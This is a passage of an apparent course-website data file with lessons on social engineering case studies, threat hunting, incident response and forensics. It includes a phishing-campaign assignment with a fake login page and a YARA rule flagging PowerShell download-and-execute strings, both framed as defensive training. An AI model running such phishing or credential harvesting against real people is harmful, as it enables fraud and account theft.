                    <ul class="list-disc pl-6 mb-4">
                        <li>Attackers impersonated Ubiquiti executives via email and convinced an employee to transfer $46.7 million to fraudulent overseas accounts.</li>
                        <li>The emails used domain spoofing and CEO fraud, where attackers impersonated high-level executives and created a sense of urgency.</li>
                    </ul>
                    <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Implementing multi-person authorization for large financial transactions and training employees to recognize phishing attempts could have prevented the attack.</li>
                    </ul>
                `},
            {
                title: 'Part: 5. The Syrian Electronic Army (SEA) & Assignment',
                content: `
                    <h4 class="font-bold">4. The Syrian Electronic Army (SEA)</h4>
                    <p class="pl-6 mb-4"><strong>Attack Overview:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>The Syrian Electronic Army used spear phishing to compromise high-profile media organizations, including The New York Times and Twitter.</li>
                        <li>Attackers sent targeted emails pretending to be from legitimate sources to obtain employee credentials, which they then used to deface websites and spread disinformation.</li>
                    </ul>
                    <p class="pl-6 mb-4"><strong>Lesson Learned:</strong></p>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Email authentication protocols (like DMARC) and user training on spear phishing are crucial defenses.</li>
                    </ul>
            
                    <h4 class="font-bold">Assignment for Week 14:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Phishing Campaign Design:</strong> Design and execute a phishing campaign using Gophish or SET. Include a well-crafted email, a fake login page, and a report on the campaign’s success metrics (e.g., click rate, credential submissions).</li>
                        <li><strong>Physical Security Bypass Report:</strong> Analyze the physical security controls of a location (workplace, campus) and document potential weaknesses that could be exploited by an attacker. Propose mitigation strategies.</li>
                        <li><strong>Case Study Analysis:</strong> Choose a real-world social engineering attack (not covered here), analyze how it was executed, and write a report on the lessons learned.</li>
                    </ul>
            
                    <h4 class="font-bold">Additional Reading:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Book:</strong> "The Art of Deception" by Kevin Mitnick — A comprehensive exploration of social engineering techniques and real-world attacks.</li>
                        <li><strong>Blog:</strong> "Social-Engineer.org" — A website dedicated to social engineering education, techniques, and news.</li>
                        <li><strong>Tool Guide:</strong> "Gophish Documentation" — Learn how to use Gophish to create and manage phishing campaigns.</li>
                    </ul>
            
                    <h4 class="font-bold">Next Week Preview:</h4>
                    <p class="pl-6 mb-4">Next week, we will conclude the module with a Capstone Project, where you’ll apply all the knowledge from the course to design and execute a comprehensive penetration test on a real-world simulation environment.</p>
                `}
                ] ,
                videoUrl: 'https://example.com/persistence-privilege-escalation',
                commands: [],
                content: ''      
                },
                {   
                    id: "module-10",
                    title: 'Module 10 - Advanced Threat Hunting and Incident Response ',
                    icon: Shield,
                    sections: [
                        {
                            title: 'Week 1: Threat Hunting Techniques',
                            content: `
                                <h4 class="font-bold">Part 1: Threat Hunting Techniques</h4>
                                <p class="pl-6 mb-4">This module introduces Advanced Threat Hunting methodologies and practical techniques for identifying and mitigating security threats within an organization’s infrastructure. We will cover how to use Security Information and Event Management (SIEM) systems, Endpoint Detection and Response (EDR) tools, and YARA rules to perform threat hunting and analyze network traffic for Indicators of Compromise (IOCs). You will also engage in hands-on labs that focus on building and executing a real-world threat hunt.</p>
                    
                                <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Introduction to threat hunting methodologies.</li>
                                    <li>Using SIEM, EDR, and YARA rules for threat hunting.</li>
                                    <li>Analyzing network traffic and logs for indicators of compromise (IOCs).</li>
                                    <li>Hands-on labs: Building and executing a threat hunt.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1. Introduction to Threat Hunting Methodologies</strong></p>
                                <p class="pl-6 mb-4">Threat Hunting is a proactive approach to detecting and mitigating cyber threats before they can cause significant damage. Unlike traditional security measures that rely on automated detection, threat hunting involves actively searching through network data, logs, and systems to identify suspicious activity that may bypass conventional defenses.</p>
                    
                                <p class="pl-6 mb-4"><strong>1.1 Definition and Objectives</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Definition:</strong> Threat hunting is the process of searching for advanced persistent threats (APTs), malware, insider threats, and other malicious activities within a network.</li>
                                    <li><strong>Objective:</strong> The goal is to find and neutralize threats that evade automated detection tools, focusing on unknown or emerging threats that may not yet have signatures.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1.2 The Threat Hunting Process</strong></p>
                                <p class="pl-6 mb-4">The threat hunting process typically follows a structured methodology that includes the following phases:</p>
                    
                                <p class="pl-6 mb-4"><strong>1.2.1 Hypothesis Generation</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Hypothesis:</strong> Formulate hypotheses based on known attack vectors, adversary tactics, techniques, and procedures (TTPs), or based on recent threat intelligence (e.g., from MITRE ATT&CK framework).</li>
                                    <li>Example: “There may be malware on our network using DNS tunneling for command and control (C2).”</li>
                                </ul>
                    
                            
                            `},
                            {
                                title: '',
                                content:`
                                <p class="pl-6 mb-4"><strong>1.2.2 Data Collection and Analysis</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Data Collection:</strong> Gather data from various sources, such as network traffic, endpoint logs, and security alerts, to support your hypothesis.</li>
                                    <li><strong>Sources:</strong> SIEM logs, EDR data, firewall logs, DNS logs, and system event logs.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1.2.3 Detection and Investigation</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Detection:</strong> Analyze the collected data for patterns or anomalies that align with your hypothesis.</li>
                                    <li>Example: Look for abnormal DNS traffic that may indicate C2 communication.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1.2.4 Response and Remediation</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Response:</strong> If a threat is detected, initiate incident response procedures to contain and mitigate the threat.</li>
                                    <li>Response actions may include isolating affected systems, revoking access, or deploying patches.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>1.2.5 Continuous Improvement</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Post-hunt Review:</strong> Review the results of the threat hunt and update detection rules, signatures, or security tools to improve future detection capabilities.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Hypothesis Creation Exercise:</strong></li>
                                    <li>Based on recent attack trends, create a hypothesis (e.g., “An insider might be exfiltrating data via cloud storage services”).</li>
                                    <li>Outline the data sources you would monitor and the techniques you would use to investigate this hypothesis.</li>
                                </ul>`
                            },
                            {
                                title: 'Part 2: Using SIEM, EDR, and YARA Rules for Threat Hunting',
                                content: `
                                    <p class="pl-6 mb-4">Threat hunters rely on powerful tools like SIEM systems, EDR platforms, and YARA rules to collect data, analyze security events, and identify potential threats. In this section, we’ll explore how each tool plays a critical role in a comprehensive threat hunting strategy.</p>
                        
                                    <p class="pl-6 mb-4"><strong>2.1 Security Information and Event Management (SIEM)</strong></p>
                                    <p class="pl-6 mb-4">A SIEM system collects and correlates security event data from various sources (e.g., network devices, servers, applications) to provide a centralized view of security activity within the organization.</p>
                        
                                    <p class="pl-6 mb-4"><strong>Key Features of SIEM:</strong></p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Log Aggregation:</strong> Collects logs from various systems, such as firewalls, IDS/IPS, application logs, and network traffic.</li>
                                        <li><strong>Correlation Rules:</strong> Uses predefined or custom rules to correlate events across different sources to detect suspicious patterns (e.g., multiple failed login attempts).</li>
                                        <li><strong>Real-Time Alerts:</strong> Provides real-time monitoring and alerting based on suspicious activity or predefined thresholds.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>Popular SIEM Tools:</strong></p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Splunk:</strong> A powerful SIEM platform that provides advanced search, monitoring, and alerting capabilities.</li>
                                        <li><strong>Elastic SIEM (ELK Stack):</strong> An open-source SIEM solution built on Elasticsearch, Logstash, and Kibana.</li>
                                        <li><strong>QRadar (IBM):</strong> A commercial SIEM solution with advanced correlation and threat intelligence capabilities.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Using SIEM for Threat Hunting:</strong></li>
                                        <li>Use Splunk or Elastic SIEM to create correlation rules based on network traffic or authentication logs.</li>
                                        <li>Perform a search for specific Indicators of Compromise (IOCs), such as failed login attempts or abnormal network traffic.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>2.2 Endpoint Detection and Response (EDR)</strong></p>
                                    <p class="pl-6 mb-4">EDR tools are designed to monitor and analyze activity at the endpoint level (workstations, servers, mobile devices) in real-time. They provide deep visibility into endpoint behavior and help detect malicious activities such as malware infections, lateral movement, or data exfiltration.</p>
                        
                                    
                                `},
                                {
                                    title:'',
                                    content:`
                                    <p class="pl-6 mb-4"><strong>Key Features of EDR:</strong></p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>Real-Time Monitoring:</strong> Tracks system events (e.g., process creation, registry modifications, file access) to detect malicious activity.</li>
                                        <li><strong>Behavioral Analysis:</strong> Analyzes system behavior over time to detect anomalies or patterns indicative of attacks.</li>
                                        <li><strong>Threat Containment:</strong> Provides features for isolating compromised endpoints or terminating malicious processes.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>Popular EDR Tools:</strong></p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>CrowdStrike Falcon:</strong> A cloud-based EDR solution that provides endpoint protection, detection, and response.</li>
                                        <li><strong>Carbon Black:</strong> An advanced EDR tool that enables continuous endpoint monitoring and threat hunting.</li>
                                        <li><strong>Microsoft Defender for Endpoint:</strong> A comprehensive EDR platform that integrates with the Windows security ecosystem.</li>
                                    </ul>
                        
                                    <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                                    <ul class="list-disc pl-6 mb-4">
                                        <li><strong>EDR Threat Hunt:</strong></li>
                                        <li>Use CrowdStrike Falcon or Carbon Black to monitor an endpoint for suspicious activities (e.g., unauthorized PowerShell scripts or lateral movement).</li>
                                        <li>Simulate an endpoint compromise and analyze the EDR logs to identify malicious actions.</li>
                                    </ul>
                                    <p class="pl-6 mb-4">YARA is a powerful tool for writing rules that help identify malware, APTs, or other suspicious files based on patterns or characteristics. YARA is commonly used in threat hunting to detect known malicious binaries or to find files that match suspicious patterns in logs or files.</p>
                                    <h4 class="pl-6 mb-4 text-2xl font-bold">YARA Rules for Threat Hunting</h4>
                        <p class="pl-6 mb-4 "><strong>Key Features of YARA:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Pattern Matching:</strong> YARA rules can define patterns based on strings, hashes, or other file characteristics to identify malware or malicious behavior.</li>
                            <li><strong>Customizable:</strong> Threat hunters can create custom YARA rules to detect specific threats or anomalies.</li>
                            <li><strong>Cross-Platform:</strong> YARA can be used across various operating systems and integrated with EDR and SIEM tools.</li>
                        </ul>

                        
                    ` },
                    {
                        title:'',
                        content:`
                        <p class="pl-6 mb-4"><strong>Example YARA Rule:</strong></p>
                        <pre class="pl-6 mb-4">rule Suspicious_PowerShell_RemoteExecution 
                        { 
                            meta: 
                                description = "Detects PowerShell scripts used for remote code execution" 
                                author = "Threat Hunter" 
                            strings: 
                                $cmd1 = "Invoke-WebRequest" 
                                $cmd2 = "IEX" 
                            condition: 
                                any of ($cmd1, $cmd2) and filesize < 1MB 
                        }</pre>

                        <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Create a YARA Rule:</strong></li>
                            <li>Write a YARA rule to detect files or processes related to known malware or suspicious activities (e.g., files with specific strings or network behavior).</li>
                            <li>Use YARA to scan files on an endpoint or logs from a SIEM system.</li>
                        </ul>`
                    },
                    {
                        title: 'Part 3: Analyzing Network Traffic and Logs for Indicators of Compromise (IOCs)',
                        content: `
                            <p class="pl-6 mb-4">Analyzing network traffic and logs is one of the core activities in threat hunting. Indicators of Compromise (IOCs) are artifacts that indicate a security breach or malicious activity. These can include suspicious network connections, file hashes, domain names, or IP addresses used by threat actors.</p>
                
                            <p class="pl-6 mb-4"><strong>3.1 Network Traffic Analysis</strong></p>
                
                            <p class="pl-6 mb-4"><strong>Key Network Traffic IOCs:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Unusual Traffic Patterns:</strong> Sudden spikes in outbound traffic, particularly to suspicious or unknown IP addresses.</li>
                                <li><strong>DNS Tunneling:</strong> Abnormal or excessive DNS queries that may indicate DNS-based data exfiltration.</li>
                                <li><strong>Beaconing:</strong> Periodic network traffic that may indicate communication with a remote command and control (C2) server.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Tools for Network Traffic Analysis:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Wireshark:</strong> A network protocol analyzer that can capture and analyze packet-level traffic.</li>
                                <li><strong>Zeek (formerly Bro):</strong> A powerful network security monitoring tool for detecting anomalies and suspicious activity in network traffic.</li>
                                <li><strong>Suricata:</strong> An open-source IDS/IPS engine that can inspect network traffic for malicious activity.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Network Traffic Analysis:</strong></li>
                                <li>Use Wireshark or Zeek to capture network traffic and look for unusual traffic patterns or connections to known malicious IPs.</li>
                                <li>Analyze DNS traffic for signs of DNS tunneling or other suspicious behavior.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>3.2 Log Analysis for IOCs</strong></p>
                
                            <p class="pl-6 mb-4">Log analysis is critical for detecting abnormal behavior in applications, network devices, and operating systems. Logs can reveal key indicators of compromise, such as unauthorized logins, file access, or privilege escalation attempts.</p>
                
                            <p class="pl-6 mb-4"><strong>Common IOCs in Logs:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Failed Login Attempts:</strong> Repeated failed login attempts could indicate brute-force attacks.</li>
                                <li><strong>Process Injection:</strong> Logs showing processes or services starting in unexpected contexts (e.g., an application invoking cmd.exe).</li>
                                <li><strong>Lateral Movement:</strong> Unusual connections between systems that are typically unrelated, indicating possible lateral movement by an attacker.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Log Analysis for IOCs:</strong></li>
                                <li>Use Elastic SIEM or Splunk to analyze logs for known IOCs (e.g., brute-force attempts, failed logins, abnormal traffic).</li>
                                <li>Create correlation rules to alert on key IOCs in the logs.</li>
                            </ul>
                        `},
                    {
                        title: 'Part 4: Hands-On Labs: Building and Executing a Threat Hunt',
                        content: `
                            <p class="pl-6 mb-4">In this hands-on lab, you will simulate a real-world threat hunt by collecting data, identifying anomalies, and mitigating potential threats in a network environment.</p>
                
                            <p class="pl-6 mb-4"><strong>Lab Steps:</strong></p>
                
                            <p class="pl-6 mb-4"><strong>Step 1: Formulate a Hypothesis</strong></p>
                            <p class="pl-6 mb-4">Based on recent threat intelligence or suspicious activity, create a hypothesis for a threat hunt.</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Example:</strong> "There is evidence of malware communicating with a C2 server using DNS tunneling."</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 2: Collect Data</strong></p>
                            <p class="pl-6 mb-4">Gather data from your organization’s network, endpoints, and security tools (e.g., SIEM, EDR, logs).</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Example:</strong> Use Zeek to capture DNS traffic and CrowdStrike for endpoint monitoring.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 3: Analyze Data</strong></p>
                            <p class="pl-6 mb-4">Search the collected data for indicators of compromise. Focus on detecting abnormal patterns, such as:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Beaconing traffic.</li>
                                <li>Unauthorized remote desktop sessions.</li>
                                <li>Suspicious process creation or lateral movement.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 4: Respond and Mitigate</strong></p>
                            <p class="pl-6 mb-4">If a threat is detected, perform the following actions:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Isolate infected systems.</li>
                                <li>Terminate malicious processes.</li>
                                <li>Revoke compromised credentials.</li>
                            </ul>
                
                            <p class="pl-6 mb-4"><strong>Step 5: Report Findings</strong></p>
                            <p class="pl-6 mb-4">Write a detailed report that includes:</p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>The hypothesis, investigation steps, and tools used.</li>
                                <li>Detected IOCs and any actions taken to mitigate the threat.</li>
                            </ul>
                        `},
                        {
                            title: 'Assignment for Week 1',
                            content: `
                                <p class="pl-6 mb-4"><strong>Threat Hunt Report:</strong> Conduct a threat hunt in a simulated network using tools like Wireshark, Splunk, or CrowdStrike Falcon. Document your hypothesis, the data sources used, the IOCs discovered, and the mitigation steps taken.</p>
                    
                                <p class="pl-6 mb-4"><strong>YARA Rule Creation:</strong> Create custom YARA rules to detect specific types of malware or suspicious behaviors, and test the rule by scanning files or logs in a controlled environment.</p>
                    
                                <p class="pl-6 mb-4"><strong>Additional Reading:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Book:</strong> "Threat Hunting and Incident Response" by Spencer Thompson — A comprehensive guide to understanding threat hunting methodologies, tools, and best practices.</li>
                                    <li><strong>MITRE ATT&CK:</strong> A framework for understanding adversary TTPs (Tactics, Techniques, and Procedures) commonly used in cyber attacks.</li>
                                </ul>
                    
                                <p class="pl-6 mb-4"><strong>Next Week Preview:</strong></p>
                                <p class="pl-6 mb-4">Next week, we will explore Incident Response and Forensics, where you will learn how to handle incidents from detection to recovery, as well as how to conduct forensic investigations in both cloud and on-premise environments.</p>
                            `},
                    {
                        title: 'Week 2: Incident Response and Forensics',
                        content: `
                            <p class="pl-6 mb-4">Part 1: This module focuses on Incident Response (IR) and Digital Forensics. In today’s rapidly evolving cyber threat landscape, organizations must be equipped to handle security incidents efficiently. We will cover the incident response lifecycle, essential techniques for digital forensics, and methods for investigating both network-based and host-based attacks.</p>
                            <p class="pl-6 mb-4">Additionally, we'll analyze case studies to understand real-world incident response scenarios and how best practices are applied in practice.</p>
                            
                            <p class="pl-6 mb-4"><strong>Topics Covered:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Incident response lifecycle: Preparation, detection, containment, eradication, recovery.</li>
                                <li>Digital forensics: Evidence collection, analysis, and reporting.</li>
                                <li>Investigating network and host-based attacks.</li>
                                <li>Case studies in incident response scenarios.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>1. Incident Response Lifecycle: Preparation, Detection, Containment, Eradication, Recovery</strong></p>
                            <p class="pl-6 mb-4">Incident Response (IR) is a structured approach to addressing and managing the aftermath of a security breach or cyberattack. It aims to handle the situation in a way that limits damage and reduces recovery time and costs. The IR process is divided into multiple phases.</p>
                            
                            <p class="pl-6 mb-4"><strong>1.1 Incident Response Lifecycle Phases</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>Phase 1: Preparation</strong></p>
                            <p class="pl-6 mb-4"><strong>Objective:</strong> To ensure that an organization is ready to respond to security incidents by establishing policies, procedures, tools, and training.</p>
                            
                            <p class="pl-6 mb-4"><strong>Key Activities:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Developing an IR Plan:</strong> Define roles, responsibilities, and communication protocols for handling incidents.</li>
                                <li><strong>Security Training:</strong> Conduct regular security awareness training for employees.</li>
                                <li><strong>Deploying Security Tools:</strong> Use security tools like firewalls, SIEM, IDS/IPS, and EDR systems to monitor and defend against attacks.</li>
                                <li><strong>Backup and Recovery:</strong> Establish secure and regular backup processes for critical systems and data.</li>
                            </ul>
                        `},
                    {
                        title: 'Part 2: Incident Response Lifecycle: Detection, Containment, and Eradication',
                        content: `
                            <p class="pl-6 mb-4"><strong>Phase 2: Detection and Analysis</strong></p>
                            <p class="pl-6 mb-4"><strong>Objective:</strong> Detect and confirm the occurrence of a security incident by analyzing various data sources (e.g., logs, alerts, network traffic) and determining its scope and severity.</p>
                            
                            <p class="pl-6 mb-4"><strong>Key Detection Sources:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>SIEM Logs:</strong> Analyze alerts and logs for suspicious behavior.</li>
                                <li><strong>EDR Systems:</strong> Monitor endpoints for malicious activity (e.g., unauthorized file access, malware execution).</li>
                                <li><strong>Anomalous Network Traffic:</strong> Analyze network traffic for indicators of compromise (e.g., unusual outbound traffic).</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Key Analysis Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Triage Alerts:</strong> Prioritize alerts to focus on critical incidents.</li>
                                <li><strong>Forensic Analysis:</strong> Investigate evidence from affected systems to determine how the attack occurred.</li>
                                <li><strong>Threat Intelligence:</strong> Use external threat intelligence feeds (e.g., MITRE ATT&CK) to identify indicators of compromise (IOCs) related to known attack techniques.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Phase 3: Containment</strong></p>
                            <p class="pl-6 mb-4"><strong>Objective:</strong> Limit the spread of the attack by isolating affected systems and preventing the attacker from gaining further access or causing more damage.</p>
                            
                            <p class="pl-6 mb-4"><strong>Containment Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Network Isolation:</strong> Disconnect compromised systems from the network.</li>
                                <li><strong>Credential Revocation:</strong> Revoke access to compromised accounts or API keys.</li>
                                <li><strong>Quarantine Infected Endpoints:</strong> Use EDR tools to isolate infected endpoints while maintaining the ability to investigate.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Phase 4: Eradication</strong></p>
                            <p class="pl-6 mb-4"><strong>Objective:</strong> Identify and remove the root cause of the security incident (e.g., malware, compromised accounts) to prevent a recurrence.</p>
                            
                            <p class="pl-6 mb-4"><strong>Eradication Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Remove Malware:</strong> Delete malware or malicious scripts from infected systems.</li>
                                <li><strong>Patch Vulnerabilities:</strong> Apply security patches to eliminate any vulnerabilities exploited by the attacker.</li>
                                <li><strong>Update Security Policies:</strong> Adjust firewall rules, access controls, or security configurations to prevent the same attack vector from being exploited again.</li>
                            </ul>
                        `},
                    {
                        title: 'Part 3: Recovery and Digital Forensics',
                        content: `
                            <p class="pl-6 mb-4"><strong>Phase 5: Recovery</strong></p>
                            <p class="pl-6 mb-4"><strong>Objective:</strong> Restore affected systems and return them to normal operation while ensuring that the threat has been fully eradicated and no residual risk remains.</p>
                            
                            <p class="pl-6 mb-4"><strong>Recovery Techniques:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>System Restoration:</strong> Rebuild or restore systems from secure backups.</li>
                                <li><strong>System Monitoring:</strong> Continue monitoring recovered systems to ensure that no malicious activity reoccurs.</li>
                                <li><strong>Post-Incident Review:</strong> Conduct a review to assess the effectiveness of the response and identify areas for improvement.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Simulated Incident Response:</strong></li>
                                <ul class="list-decimal pl-8 mb-4">
                                    <li>Choose a common incident scenario (e.g., ransomware attack, unauthorized access).</li>
                                    <li>Walk through each phase of the incident response lifecycle, documenting the key actions you would take in each phase.</li>
                                </ul>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>2. Digital Forensics: Evidence Collection, Analysis, and Reporting</strong></p>
                            <p class="pl-6 mb-4">Digital forensics is the process of collecting, preserving, analyzing, and reporting on digital evidence. Forensics plays a crucial role in both legal proceedings and incident response, as it allows analysts to trace the actions of attackers and understand the full scope of a breach.</p>
                            
                            <p class="pl-6 mb-4"><strong>2.1 Forensic Evidence Collection</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>1. Preserving the Chain of Custody</strong></p>
                            <p class="pl-6 mb-4">The chain of custody is a documented process that ensures the integrity of digital evidence from collection to presentation in court or an internal investigation. Every interaction with the evidence must be recorded, ensuring that it has not been tampered with.</p>
                        `},
                        {
                            title: 'Part 5: Forensic Imaging and Analysis',
                            content: `
                                <p class="pl-6 mb-4"><strong>2. Forensic Imaging</strong></p>
                                <p class="pl-6 mb-4"><strong>• Disk Imaging:</strong> Create a bit-by-bit copy of the entire storage device (e.g., hard drive, SSD). This allows forensic investigators to analyze the disk without modifying the original data.</p>
                                <p class="pl-6 mb-4"><strong>o Tool:</strong> Use FTK Imager or dd for creating forensic disk images.</p>
                                <pre class="pl-6 mb-4"><code>dd if=/dev/sda of=/mnt/evidence/disk_image.dd bs=4M</code></pre>
                                
                                <p class="pl-6 mb-4"><strong>• Memory Dump:</strong> Capture the volatile memory (RAM) of a system before shutting it down. This may contain valuable data such as malware, encryption keys, and live network connections.</p>
                                <p class="pl-6 mb-4"><strong>o Tool:</strong> Use Volatility or DumpIt for memory acquisition.</p>
                                
                                <p class="pl-6 mb-4"><strong>3. Network Forensics</strong></p>
                                <p class="pl-6 mb-4"><strong>• Packet Capture:</strong> Capture network traffic using tools like Wireshark or tcpdump for later analysis. This can provide insight into attacker communications, data exfiltration, or command-and-control (C2) activity.</p>
                                <pre class="pl-6 mb-4"><code>tcpdump -i eth0 -w network_capture.pcap</code></pre>
                                
                                <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li>Create a forensic disk image of a compromised machine using FTK Imager or dd.</li>
                                    <li>Perform a memory dump using Volatility and examine the captured data for signs of malware or suspicious processes.</li>
                                </ul>
                                
                                <p class="pl-6 mb-4"><strong>2.2 Forensic Analysis</strong></p>
                                <p class="pl-6 mb-4">After collecting evidence, forensic analysts must sift through the data to uncover how the attack occurred, what actions the attacker took, and what data may have been exfiltrated or tampered with.</p>
                                
                                <p class="pl-6 mb-4"><strong>Key Forensic Analysis Techniques:</strong></p>
                                
                                <p class="pl-6 mb-4"><strong>1. File System Analysis</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Identify Malicious Files:</strong> Look for suspicious files, unusual file creation/modification times, or unauthorized access to sensitive files.</li>
                                    <li><strong>Log Analysis:</strong> Review system logs, application logs, and security event logs for anomalous activity (e.g., failed logins, system reboots, privilege escalations).</li>
                                </ul>
                                
                                <p class="pl-6 mb-4"><strong>2. Malware Analysis</strong></p>
                                <ul class="list-disc pl-6 mb-4">
                                    <li><strong>Static Malware Analysis:</strong> Analyze the characteristics of malware binaries (e.g., hashes, strings, imports) without executing the code. Tools like VirusTotal and PEStudio can help identify known malware.</li>
                                    <li><strong>Dynamic Malware Analysis:</strong> Run malware in a sandbox environment to observe its behavior, network activity, and interactions with the system.</li>
                                </ul>
                            `},
                    {
                        title: 'Part 6: Forensic Imaging and Analysis',
                        content: `
                            <p class="pl-6 mb-4"><strong>2. Forensic Imaging</strong></p>
                            <p class="pl-6 mb-4"><strong>• Disk Imaging:</strong> Create a bit-by-bit copy of the entire storage device (e.g., hard drive, SSD). This allows forensic investigators to analyze the disk without modifying the original data.</p>
                            <p class="pl-6 mb-4"><strong>o Tool:</strong> Use FTK Imager or dd for creating forensic disk images.</p>
                            <pre class="pl-6 mb-4"><code>dd if=/dev/sda of=/mnt/evidence/disk_image.dd bs=4M</code></pre>
                            
                            <p class="pl-6 mb-4"><strong>• Memory Dump:</strong> Capture the volatile memory (RAM) of a system before shutting it down. This may contain valuable data such as malware, encryption keys, and live network connections.</p>
                            <p class="pl-6 mb-4"><strong>o Tool:</strong> Use Volatility or DumpIt for memory acquisition.</p>
                            
                            <p class="pl-6 mb-4"><strong>3. Network Forensics</strong></p>
                            <p class="pl-6 mb-4"><strong>• Packet Capture:</strong> Capture network traffic using tools like Wireshark or tcpdump for later analysis. This can provide insight into attacker communications, data exfiltration, or command-and-control (C2) activity.</p>
                            <pre class="pl-6 mb-4"><code>tcpdump -i eth0 -w network_capture.pcap</code></pre>
                            
                            <p class="pl-6 mb-4"><strong>Practical Activity:</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li>Create a forensic disk image of a compromised machine using FTK Imager or dd.</li>
                                <li>Perform a memory dump using Volatility and examine the captured data for signs of malware or suspicious processes.</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>2.2 Forensic Analysis</strong></p>
                            <p class="pl-6 mb-4">After collecting evidence, forensic analysts must sift through the data to uncover how the attack occurred, what actions the attacker took, and what data may have been exfiltrated or tampered with.</p>
                            
                            <p class="pl-6 mb-4"><strong>Key Forensic Analysis Techniques:</strong></p>
                            
                            <p class="pl-6 mb-4"><strong>1. File System Analysis</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Identify Malicious Files:</strong> Look for suspicious files, unusual file creation/modification times, or unauthorized access to sensitive files.</li>
                                <li><strong>Log Analysis:</strong> Review system logs, application logs, and security event logs for anomalous activity (e.g., failed logins, system reboots, privilege escalations).</li>
                            </ul>
                            
                            <p class="pl-6 mb-4"><strong>2. Malware Analysis</strong></p>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Static Malware Analysis:</strong> Analyze the characteristics of malware binaries (e.g., hashes, strings, imports) without executing the code. Tools like VirusTotal and PEStudio can help identify known malware.</li>
                                <li><strong>Dynamic Malware Analysis:</strong> Run malware in a sandbox environment to observe its behavior, network activity, and interactions with the system.</li>
                            </ul>
                        `},
                    {
                        title: 'Part 7: Memory Analysis and Forensic Reporting',
                        content: `
                            <p class="pl-6 mb-4"><strong>3. Memory Analysis</strong></p>
